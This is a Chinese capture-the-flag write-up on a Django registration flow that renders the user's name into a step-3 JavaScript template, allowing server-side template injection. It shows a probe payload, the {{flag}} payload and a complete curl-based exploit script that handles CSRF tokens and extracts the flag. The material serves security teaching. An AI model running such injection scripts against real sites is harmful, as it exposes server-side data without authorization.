# X-025-24 Art Gallery

> Do you know that sometimes dynamically generated JS is done with DjangoTemplates?

本题是一个 Django 项目，注册流程第 3 步存在服务端模板注入（SSTI）。

- 入口发现：从首页浏览导航，发现注册流程 `/accounts/register/step1/`、`/accounts/register/step2/`、`/accounts/register/step3/`。
- 反射点探测：在 Step1 的 `name` 中输入容易观察的 payload，例如 `test123`，到 Step3 观察是否有“欢迎/问候/弹窗”包含该名字。
- SSTI 探测：将 `name` 替换为模板表达式，如 `{{7|add:7}}`（Django 模板过滤器），若 Step3 中渲染为 `14`，可确认为 Django 模板注入。

输入 `name` 为 `{{7|add:7}}`：
![image.png](https://x/x12090724491.png)
说明确实存在 SSTI 漏洞。

由于模板引擎是 Django Template Language（DTL），不是 Jinja2。DTL 是强沙箱，我们无法进行命令执行，那么我们只能猜测 flag 在某个变量里面，然后通过遍历可能的变量名来得到 flag。

经过尝试，发现存储 flag 的变量名即为 `flag`，所以我们最终的 payload 就是：
```
{{flag}}
```
## EXP
```bash
BASE="http://ip32788"
JAR="cookies-ctf.txt"
rm -f "$JAR"

# Step 1: 获取 CSRF 并提交 name={{flag}}
CSRF1=$(curl -s -c "$JAR" "$BASE/accounts/register/step1/" | \
        sed -n 's/.*name="csrfmiddlewaretoken" value="\([^"]*\)".*/\1/p' | head -n1)

curl -s -b "$JAR" -c "$JAR" -e "$BASE/accounts/register/step1/" -X POST \
  -d "csrfmiddlewaretoken=$CSRF1" \
  --data-urlencode "name={{flag}}" \
  --data-urlencode "password=1234567890a" \
  "$BASE/accounts/register/step1/" -o /dev/null -L

# Step 2: 获取 CSRF 并提交 email
CSRF2=$(curl -s -b "$JAR" "$BASE/accounts/register/step2/" | \
        sed -n 's/.*name="csrfmiddlewaretoken" value="\([^"]*\)".*/\1/p' | head -n1)

curl -s -b "$JAR" -c "$JAR" -e "$BASE/accounts/register/step2/" -X POST \
  -d "csrfmiddlewaretoken=$CSRF2" \
  --data-urlencode "email=ctfer@example.com" \
  "$BASE/accounts/register/step2/" -o /dev/null -L

# Step 3: 访问并从 alert 文本中提取 flag
HTML=$(curl -s -b "$JAR" "$BASE/accounts/register/step3/")
FLAG=$(printf "%s" "$HTML" | sed -n 's/.*alert("Hello \(.*\)\. Just Now up to 50% OFF .*/\1/p' | head -n1)

echo "Flag: $FLAG"
```
